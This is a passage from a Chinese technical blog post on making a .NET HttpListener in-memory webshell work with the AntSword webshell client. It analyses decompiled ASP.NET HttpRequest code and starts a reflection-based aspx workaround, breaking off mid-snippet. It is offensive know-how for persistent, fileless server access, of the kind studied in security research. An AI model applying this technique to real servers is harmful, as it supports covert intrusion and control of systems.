+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>最后终于让我发现了一个规律：只要涉及到需要第三方参数的就会报空指针错误，硬编码Payload可以正常运行。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>以打开目录为例，在exe中加了这样一句调试语句，同时burp重放蚁剑的Payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;path&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;path is not null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;path is null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>果然，提示收到的path参数为空</p>
+<p>为什么会这样呢？猜测可能是构造出来的Request对象有问题，就去翻了一下Request的源码，看Form属性是如何初始化以及工作的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">public</span> <span class="n">NameValueCollection</span> <span class="n">Form</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">get</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">EnsureForm</span><span class="p">();</span><span class="c1">//主要逻辑
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_flags</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="n">_flags</span><span class="p">.</span><span class="n">Clear</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="n">ValidateHttpValueCollection</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">,</span> <span class="n">RequestValidationSource</span><span class="p">.</span><span class="n">Form</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">NameValueCollection</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看EnsureForm()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">internal</span> <span class="n">HttpValueCollection</span> <span class="nf">EnsureForm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_form</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span><span class="c1">//判断_form是否为空
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">_form</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpValueCollection</span><span class="p">();</span><span class="c1">//如果为空则new一个HttpValueCollection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_wr</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span><span class="c1">//判断this._wr是否为null
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">this</span><span class="p">.</span><span class="n">FillInFormCollection</span><span class="p">();</span><span class="c1">//如果不是null则调用FillInFormCollection方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">.</span><span class="n">MakeReadOnly</span><span class="p">();</span><span class="c1">//否则MakeReadOnly
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看FillInFormCollection()，主要功能就是读取input输入流，然后解析为一个一个键值对赋值给this._form。同样前面也有一个this._wr 是否为null的判断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="k">private</span> <span class="kt">void</span> <span class="nf">FillInFormCollection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_wr</span> <span class="o">==</span> <span class="n">null</span> <span class="o">||</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="n">_wr</span><span class="p">.</span><span class="n">HasEntityBody</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">string</span> <span class="n">contentType</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="n">ContentType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">contentType</span> <span class="o">==</span> <span class="n">null</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="n">_readEntityBodyMode</span> <span class="o">==</span> <span class="n">ReadEntityBodyMode</span><span class="p">.</span><span class="n">Bufferless</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">StringUtil</span><span class="p">.</span><span class="n">StringStartsWithIgnoreCase</span><span class="p">(</span><span class="n">contentType</span><span class="p">,</span> <span class="s">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="c1">//application/x-www-form-urlencoded 分析
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HttpRawUploadedContent</span> <span class="n">entireRawContent</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="n">GetEntireRawContent</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">entireRawContent</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">bytes</span> <span class="o">=</span> <span class="n">entireRawContent</span><span class="p">.</span><span class="n">GetAsByteArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">bytes</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="c1">//处理键值对的主要函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">.</span><span class="n">FillFromEncodedBytes</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">ContentEncoding</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">throw</span> <span class="k">new</span> <span class="n">HttpException</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">&#34;Invalid_urlencoded_form_data&#34;</span><span class="p">),</span> <span class="n">ex</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="c1">//multipart/form-data 数据流分析
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">StringUtil</span><span class="p">.</span><span class="n">StringStartsWithIgnoreCase</span><span class="p">(</span><span class="n">contentType</span><span class="p">,</span> <span class="s">&#34;multipart/form-data&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MultipartContentElement</span><span class="p">[]</span> <span class="n">multipartContent</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="n">GetMultipartContent</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">multipartContent</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">multipartContent</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="o">++</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">multipartContent</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">IsFormItem</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">.</span><span class="n">ThrowIfMaxHttpCollectionKeysExceeded</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="n">_form</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">multipartContent</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">Name</span><span class="p">,</span> <span class="n">multipartContent</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">GetAsString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ContentEncoding</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么我们是哪一步导致form没有成功构造呢，前面我们可以看到构造过程中多次对this._wr成员进行是否为空的判断。问题也就出在这里。</p>
+<p>HttpRequest总共有三个构造函数，其中第二个public HttpRequest(string filename, string url, string queryString)是Hiding师傅使用的，也是唯一一个可以直接public调用的构造函数。但是在第二个第三个构造函数中，都会默认把this._wr赋值为null，所以也就无法走到BuildForm的过程中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">internal</span> <span class="nf">HttpRequest</span><span class="p">(</span><span class="n">HttpWorkerRequest</span> <span class="n">wr</span><span class="p">,</span> <span class="n">HttpContext</span> <span class="n">context</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_wr</span> <span class="o">=</span> <span class="n">wr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_context</span> <span class="o">=</span> <span class="n">context</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nf">HttpRequest</span><span class="p">(</span><span class="n">string</span> <span class="n">filename</span><span class="p">,</span> <span class="n">string</span> <span class="n">url</span><span class="p">,</span> <span class="n">string</span> <span class="n">queryString</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_wr</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpWorkerRequest</span><span class="p">)</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_pathTranslated</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_httpMethod</span> <span class="o">=</span> <span class="s">&#34;GET&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Uri</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_path</span> <span class="o">=</span> <span class="n">VirtualPath</span><span class="p">.</span><span class="n">CreateAbsolute</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_url</span><span class="p">.</span><span class="n">AbsolutePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryStringText</span> <span class="o">=</span> <span class="n">queryString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryStringOverriden</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpValueCollection</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_queryStringText</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PerfCounters</span><span class="p">.</span><span class="n">IncrementCounter</span><span class="p">(</span><span class="n">AppPerfCounter</span><span class="p">.</span><span class="n">REQUESTS_EXECUTING</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">internal</span> <span class="nf">HttpRequest</span><span class="p">(</span><span class="n">VirtualPath</span> <span class="n">virtualPath</span><span class="p">,</span> <span class="n">string</span> <span class="n">queryString</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_wr</span> <span class="o">=</span> <span class="p">(</span><span class="n">HttpWorkerRequest</span><span class="p">)</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_pathTranslated</span> <span class="o">=</span> <span class="n">virtualPath</span><span class="p">.</span><span class="n">MapPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_httpMethod</span> <span class="o">=</span> <span class="s">&#34;GET&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Uri</span><span class="p">(</span><span class="s">&#34;http://localhost&#34;</span> <span class="o">+</span> <span class="n">virtualPath</span><span class="p">.</span><span class="n">VirtualPathString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_path</span> <span class="o">=</span> <span class="n">virtualPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryStringText</span> <span class="o">=</span> <span class="n">queryString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryStringOverriden</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_queryString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpValueCollection</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_queryStringText</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PerfCounters</span><span class="p">.</span><span class="n">IncrementCounter</span><span class="p">(</span><span class="n">AppPerfCounter</span><span class="p">.</span><span class="n">REQUESTS_EXECUTING</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么为什么Hiding连接哥斯拉还能成功呢？</p>
+<p>那是因为哥斯拉从头到尾只需要一个参数，并且这一个参数是通过Hiding师傅自己实现的parse_post函数来解析出来的(<a href="https://github.com/A-D-Team/SharpMemshell/blob/main/HttpListener/memshell.cs#L151" target="_blank" rel="noopener noreferrer">https://github.com/A-D-Team/SharpMemshell/blob/main/HttpListener/memshell.cs#L151</a>)</p>
+<p>但是蚁剑是多个参数的模式，需要在payload中获取到参数才可以。</p>
+<p>为了解决这个问题，我们其实没有必要再去凑一个HttpWorkerRequest，完全可以跳过这一步，直接反射调用最核心的_form字段的FillFromEncodedBytes函数，使得我们new出来的Request对象是一个可以完整使用的Request对象。</p>
+<p>在这里我把核心代码抽象为一个aspx，测试我们构造出来的reqeust对象能否真正获取到请求的各个参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="o">=</span><span class="s">&#34;C#&#34;</span> <span class="n">Debug</span><span class="o">=</span><span class="nb">true</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="o">=</span><span class="s">&#34;System.Reflection&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">     <span class="n">byte</span><span class="p">[]</span> <span class="n">rawData</span> <span class="o">=</span> <span class="k">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">Request</span><span class="p">.</span><span class="n">InputStream</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Request</span><span class="p">.</span><span class="n">InputStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">rawData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rawData</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">HttpRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpRequest</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">Request</span><span class="p">.</span><span class="n">Url</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">Request</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">     <span class="n">FieldInfo</span> <span class="n">field</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_form&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Type</span> <span class="n">formtype</span> <span class="o">=</span> <span class="n">field</span><span class="p">.</span><span class="n">FieldType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">     <span class="n">MethodInfo</span> <span class="n">method</span> <span class="o">=</span> <span class="n">formtype</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;FillFromEncodedBytes&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">ConstructorInfo</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">formtype</span><span class="p">.</span><span class="n">GetConstructor</span><span class="p">(</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">constructor</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">method</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="k">new</span> <span class="n">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">rawData</span><span class="p">,</span> <span class="n">Request</span><span class="p">.</span><span class="n">ContentEncoding</span> <span class="p">});</span>
